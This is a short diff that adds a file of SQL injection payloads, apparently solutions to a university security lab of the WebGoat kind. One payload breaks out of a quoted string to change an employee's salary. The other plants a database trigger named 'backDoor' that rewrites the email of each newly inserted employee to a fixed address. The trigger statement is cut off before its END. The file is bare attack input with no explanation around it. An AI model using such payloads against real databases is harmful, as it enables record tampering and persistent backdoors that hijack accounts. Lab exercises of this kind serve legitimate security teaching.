@@ -1,0 +1,3 @@
+''; UPDATE employee SET Salary = '500500' WHERE userid = '101';
+
+;CREATE TRIGGER backDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='ece568@utoronto.ca' WHERE userid = NEW.userid
